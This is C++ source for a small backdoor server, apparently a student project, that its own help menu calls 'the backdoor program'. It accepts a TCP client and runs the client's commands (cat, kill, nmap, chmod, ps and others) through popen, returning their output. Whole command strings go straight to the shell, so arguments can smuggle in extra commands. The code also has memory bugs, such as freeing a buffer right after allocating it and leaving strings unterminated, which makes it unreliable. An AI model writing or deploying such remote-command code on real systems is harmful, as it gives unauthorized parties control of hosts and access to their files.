#include "BDServer.h"

/*
  Default constructor, initiates a default port number
*/
BDServer :: BDServer(){
  _PortNo = DEFAULT_PORTNO;

  //initialize server socket and client socket to known state
  _ServerSocket = -1;
  _ClientSocket = -1;
}

/*
  Alternative constructor, given a port number it will set the specified
  port number as long as the port number falls in a valid range.

  Otherwise, default port is specified.
*/
BDServer :: BDServer(int portNo){
  if(portNo > 256 && portNo <= 65535){
    _PortNo = portNo;
  }else{
    _PortNo = DEFAULT_PORTNO;
  }

  //initialize server socket and client socket to known state
  _ServerSocket = -1;
  _ClientSocket = -1;

}

/*
  startServer

  initializes the server socket then waits for a connection
*/
void BDServer :: startServer(){

  _ServerSocket = socket(AF_INET, SOCK_STREAM, 0);
  _ServerAddress.sin_family = AF_INET;
  _ServerAddress.sin_port = htons(_PortNo);
  _ServerAddress.sin_addr.s_addr = inet_addr("127.0.0.1");
  memset(_ServerAddress.sin_zero, '\0', sizeof _ServerAddress.sin_zero);

  bind(_ServerSocket, (struct sockaddr *) &_ServerAddress, sizeof(_ServerAddress));

  waitForConnection();
}

/*
  waitForConnection

  waitForConnection will listen for a connection on the server socket, but only if the server socket has been
  initialized. Once the client is connected, a message is sent to the client to confirm that the server is connected
  and the server waits for a command.
 */
void BDServer :: waitForConnection(){
  char buffer[1024];

  if (_ServerSocket > -1){
    if(listen(_ServerSocket, 1) == 0){
      printf("Listening\n");
    }

    /* accept call creates a new socket for incomming connection */
    _AddrSize = sizeof _ServerStorage;
    _ClientSocket = accept(_ServerSocket, (struct sockaddr *) &_ServerStorage, &_AddrSize);

    printf("Client connected.\n");

    strcpy(buffer, "Server: Connected.\n");
    write(_ClientSocket, buffer, strlen(buffer));
    
    //once a conncetion has been made, wait for a command
    waitForCommand();
  }else{
    printf("Initialize server socket first ya dunce");
  }
}

/*
  waitForCommand

  waitForCommand assumes that a TCP connection has been made to a client.
  It then waits for a command to be sent from the client to parse and execute
  if the command is one that the sevrer can handle. If waitForCommand receives
  the string "off" or "help", then it handles the command directly, otherwise
  it hands the connection off to be parsed.
*/
void BDServer :: waitForCommand()
{
  int amountRead;
  char buffer[MAX_PATH];

  terminalLine();
  
  amountRead = read(_ClientSocket, buffer, MAX_PATH);
  
  while(amountRead > 0){
    trimLeft(buffer, strlen(buffer));
    trimRight(buffer, strlen(buffer));
    if (amountRead == 1){
      try{
	memcpy(buffer, "Empty command\n", 14);
	write(_ClientSocket, buffer, 14);
	memset(buffer, 0, MAX_PATH);
      }catch(const std::exception& e){
	//client has disconnected
	break;
      }
    }else if(strncmp(buffer, "off", strlen(buffer)) == 0){
      memcpy(buffer, "Shutting down.\n", 15);
      write(_ClientSocket, buffer, 14);
      return;
    }else if(strncmp(buffer, "help", strlen(buffer)) == 0){
      helpMenu();
    }else{
      //executeCommand(buffer);
      parseCommand(buffer);
      memset(buffer, 0, MAX_PATH);
      printf("Waiting for command...\n");
    }
    
    terminalLine();
   
    amountRead = read(_ClientSocket, buffer, MAX_PATH);
  }

  printf("Client disconnected. Resetting client socket.\n");
  resetConnection();
  waitForConnection();
}

/*
  terminalLine

  terminalLine simply prints a neatly formatted terminal line displaying the Directory stats (such as current working directory)
  with a terminal prompt underneath for the client.

 */
void BDServer :: terminalLine(){
  char buffer[MAX_PATH];
  memcpy(buffer, "\n-----------------------------------------------\n\0", 51);
  write(_ClientSocket, buffer, 51);
  
  printDirectoryStats();
  
  memcpy(buffer, ">> \0", 4);
  write(_ClientSocket, buffer, 4);
  memset(buffer, 0, MAX_PATH);
}

/*
  parseCommand

  Parses commands received from the client. First the command is split on whitespace to find
  the function being requested (ls, cd, cat, etc), then the command is split again on whitespace
  to retrieve arguments. parseCommand has two main logic pathways: functions with arguments and 
  functions without. If the command is not one that the server has been built to handle, a message
  will be sent to the client indicating that it cannot handle the command. If the command is one with
  output, then the output will be returned to the client (ls, cd, pwd, etc). If the command is one without, 
  then no output will be sent to the client (chmod, kill).

  Assumptions: It is assumed that the client sending the command knows the particular syntax of the 
  arugments for the function for which they have sent. For example, if the client sends kill, a valid
  function, with -adlkasjdklj, an invalid argument, the command will simply fail and no output will be sent
  to the client. This is due to the issue the popen does not return failed text to the popen file stream, but
  rather to the environment in which the server is running.

  There are ways around this, such as hijacking the output stream of the server, however we felt that it was
  an acceptable assumption that the user connecting to the server knows the basics of the linux commands they are sending
  and that a graceful failure to execute the command was enough for the servers purposes.

  Accepted commands:
  pwd							- print working directory
  cd [dir]						- change directory to <dir>
  ls [params]					        - list the contents of the current working directory
  ll 							- (ls -FGlAihp) more detailed ls
  cat <file>						- return contents of <file>
  who							- list currently logged in users
  net							- show current network configuration
  ps [params]						- show currently running processes
  kill <params> 					- runs kill command with given parameters
  nmap <params>						- run nmap with <params>
  netstat <params>					- Display routing table
  chmod <permissions> <file>				- change <file> accessibility to <permissions>

  Any of the above where the parameters are in angle brackets <params>, the parameters are required.
  Any of the above commands where the parameters are in square brackets [params], the parameters are optional and the
  function has a runnable command with no arguments.
  
*/

void BDServer :: parseCommand(char* command){
  char* cpy;
  char* function;
  //ensures that arguments gets null terminated
  char* arguments = (char*)calloc(1024, 1);
  free(arguments);
  
  //strtok modifies the past in string - make a copy.
  cpy = (char*)calloc(strlen(command), 1);
  memcpy(cpy, command, strlen(command));
  
  //extract function - first characters up to space or tab
  function = strtok(cpy, " \t");
  
  arguments = strtok(NULL, " \t");

  //if next strtok read on NULL is NULL then there are no arguments (nothing following function)
  if(arguments == NULL){
    if(strcmp(function, "cd") == 0){
      //cd with no arguments, switch to home directory
      memcpy(cpy, getenv("HOME"), strlen(getenv("HOME")));
      changeDirectory(cpy);
    }else if(strcmp(function, "ls") == 0){
      //ls with no args
      printf("ls no arguments\n");
    }else if(strcmp(function, "ll") == 0){
      memcpy(cpy, "ls -FGlAihp\0", 12);
      executeCommand(cpy);
    }else if(strcmp(function, "pwd") == 0){
      printWorkingDirectory();

      /*we opted to keep each additional function contained within their own 
	conditional branch instead of combining them (even though they execute the same
	function) to allow for future additional logic if required
       */
    }else if(strcmp(function, "who") == 0){
      executeCommand(function);
    }else if(strcmp(function, "net") == 0){
      executeCommand(function);
    }else if(strcmp(function, "ps") == 0){
      executeCommand(function);
    }else{
      badFunction(command);
    }
  }else{
    if(strcmp(function, "cd") == 0){
      changeDirectory(arguments);

      /*we opted to keep each additional function contained within their own 
	conditional branch instead of combining them (even though they execute the same
	function) to allow for future additional logic if required
       */
    }else if (strcmp(function, "ls") == 0){
      executeCommand(command);
    }else if (strcmp(function, "cat") == 0){
      executeCommand(command);
    }else if (strcmp(function, "kill") == 0){
      executeCommand(command);
    }else if (strcmp(function, "nmap") == 0){
      executeCommand(command);
    }else if (strcmp(function, "netstat") == 0){
      executeCommand(command);
    }else if (strcmp(function, "chmod") == 0){
      executeCommand(command);
    }else if (strcmp(function, "ps") == 0){
      executeCommand(command);
    }else{
      badFunction(command);
    }  
  }

  free(cpy);
}


/*
  badFunction

  displays a message to the client indicating that the received function was not a supported command
 */
void BDServer :: badFunction(char *command)
{
  char *output = (char*)malloc(MAX_PATH * sizeof(char));
  char *placeholder = output;
  
  printf("In bad function\n");
  
  memcpy(output, command, strlen(command));
  output += strlen(command);
  memcpy(output, ": is not a valid command.\n\0", 27);
  output = placeholder;

  write(_ClientSocket, output, strlen(output) - 1); 

  free(output);
}



/*
  executeCommand

  executeCommand takes in a command and executes it and redirects the output
  of the response so that the output can be sent to the client socket.
  
  If a command is received that fails to run, no output is sent to the client
  to indicate as such as popen prints the error output to the running executable rather than
  to the file descriptor.

  Our reasoning behind not changing this is described in the comments of parseCommand 
*/
void BDServer :: executeCommand(char* command)
{
  FILE *fp;
  char path[MAX_PATH];
  char *output = (char*)malloc(MAX_PATH);
  char *placeholder = output;
  int totalSize = 0;
  
  printf("%s\n", command);

  fp = popen(command, "r");
  if(fp != NULL){
    while(fgets(path, sizeof(path), fp) != NULL){
      memcpy(output, path, strlen(path));
      totalSize += strlen(path) + 1;
      output += strlen(path) + 1;
      memset(path, 0, MAX_PATH);
    }
    totalSize -= (strlen(path) + 1);
  }else{
    printf("Bad command\n");
  }
  
  output[0] = '\0';
  output = placeholder;
  
  fclose(fp);
  
  write(_ClientSocket, output, totalSize);
  memset(output, 0, MAX_PATH);
  free(output);
}


/*
  helpMenu

  Displays a neatly formatted menu to the screen for the client to view all possible commands
 */
void BDServer :: helpMenu(){
  printf("Printing command list and descriptions...\n");
  char buffer[MAX_PATH] = "Command listings:\n"
    "-----------------------------------------------\n"
    "[] indicates optional arguments, <> indicates required\n"
    "pwd		                - print working directory\n"
    "cd [dir]			- change directory to <dir>\n"
    "ls [params]		        - list directory contents\n"
    "ll 			        - (ls -FGlAihp) more detailed ls\n"
    "cat <file>	       		- return contents of <file>\n"
    "who				- list currently logged in users\n"
    "net				- show current network configuration\n"
    "ps			       	- show currently running processes\n"
    "kill -9 <pid>			- kill process <pid>\n"
    "nmap <params>			- run nmap with <params>\n"
    "netstat <params>		- Display routing information (-r for example)\n"
    "chmod <permissions> <file>	- change <file> accessibility to <permissions>\n"
    "help				- print this list of commands\n"
    "off				- terminate the backdoor program\n"
    "-----------------------------------------------\n\n\0";
  write(_ClientSocket, buffer, strlen(buffer)-1);
  memset(buffer, 0, MAX_PATH);
}

/*
  printWorkingDirectory

  prints the working directory, else tells user bad directory. Should not fail unless the server
  somehow finds itself in the directory to which it does not have permissions.
 */
void BDServer :: printWorkingDirectory(){
  char dir[1024];
  if (getcwd(dir, sizeof(dir)) != NULL){
    write(_ClientSocket, dir, strlen(dir));
  }else{
    printf("Bad dir\n");
    memcpy(dir, "Bad directory\n", 14);
    write(_ClientSocket, dir, 14);
  }
}

/*
  printDirectoryStats

  prints some statisitcs about the current directory in a neatly formatted line.
  currently, only prints the current working directory, but may be modified in the future to include
  stats such as currently logged in user, ip, etc.
 */
void BDServer :: printDirectoryStats(){
  char dir[1024];
  char *buffer = (char*)malloc(1029);
  char *placeholder = buffer;
  
  if (getcwd(dir, sizeof(dir)) != NULL){
    memcpy(buffer, "@[", 2);
    buffer += 2;
    memcpy(buffer, dir, strlen(dir));
    buffer += strlen(dir);
    memcpy(buffer, "]\n\0", 3);
    buffer = placeholder;
    write(_ClientSocket, buffer, strlen(dir) + 5);
  }

  free(buffer);
}

/*
  changeDirectory

  Changes the working directory to the specified directory. If a bad directory is given,
  the client is notified.
 */
void BDServer :: changeDirectory(char *directory){
  int ret = chdir(directory);
  printf("%s\n", directory);
  char buffer[1024] = "Bad directory\n\0";
  if (ret == -1){
    write(_ClientSocket, buffer, strlen(buffer));
  }
}

/*
  resetConnection

  resetConnection is called when a client disconnect is detected. It closes the current client
  socket and resets the client socket to a known state (for later error detection).
 */
void BDServer :: resetConnection(){
  close(_ClientSocket);

  _ClientSocket = -1;
}

/* UTIL Section
   
   We did not feel there were enough utility functions to warrent their own class just yet,
   however if this section grows - they will be moved to their own file
 */


/*
  trimLeft

  trims the whitespace to the left of the string and moves all characters into the 0 indexed position
 */
void BDServer :: trimLeft(char *input, int length){
  int index = 0, i = 0;

  while(index < length && (input[index] == ' ' || input[index] == '\n' || input[index] == '\t')){
    index ++;
  }

  while(i + index < length){
    input[i] = input[i + index];
    i++;
  }

  input[i] = '\0';
}

/*
  trimRight

  trims the whitespace to the right of the string and replaces the whitespace with null terminators
  to ensure easy usage later with functions such as strlen and strcmp
 */
void BDServer :: trimRight(char *input, int length){
  int index = length - 1;

  while(index > 0 && (input[index] == ' ' || input[index] == '\n' || input[index] == '\t')){
    input[index] = '\0';
    index --;
  }
}

/* Getters/Setters */
void BDServer :: setPort(int port){
  if(port > 256 && port <= 65535){
    _PortNo = port;
  }
}

int BDServer :: getPort(){
  return _PortNo;
}
/* End getters/Setters */
